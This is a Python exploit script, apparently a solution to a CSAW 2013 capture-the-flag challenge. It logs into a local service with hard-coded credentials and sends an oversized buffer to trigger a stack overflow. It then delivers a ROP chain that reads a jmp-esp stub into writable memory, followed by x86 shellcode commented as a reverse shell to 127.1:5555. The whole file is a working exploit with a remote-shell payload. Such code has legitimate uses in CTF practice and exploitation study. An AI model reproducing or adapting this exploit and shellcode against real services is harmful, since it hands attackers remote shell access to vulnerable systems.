import socket
import struct
import time

def rop(*args):
        return struct.pack('I'*len(args), *args)

# reverse shell: 127.1:5555
shellcode = "\x68" \
"\x7f\x01\x01\x01" \
"\x5e\x66\x68" \
"\xd9\x03" \
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02" \
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79" \
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a" \
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f" \
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" \
"\xeb\xce"

read = 0x80486e0
pop3ret = 0x0804956d
writable = 0x804b000
jmpesp = "\xff\xe4"

s = socket.socket()
s.connect(('localhost', 34266))

s.send("csaw2013")
s.recv(1024)
s.send("S1mplePWD")
s.recv(1024)

print('[+] Credentials sent')

s.send("65535")  # overflow

buf = "A" * 0x420
buf += rop(
        read,
        pop3ret,
        4,
        writable,
        2,

        writable
        )
buf += shellcode

s.send(buf)
print('[+] Stage 1 sent')
time.sleep(.5)
s.send(jmpesp)
print('[+] Stage 2 sent')
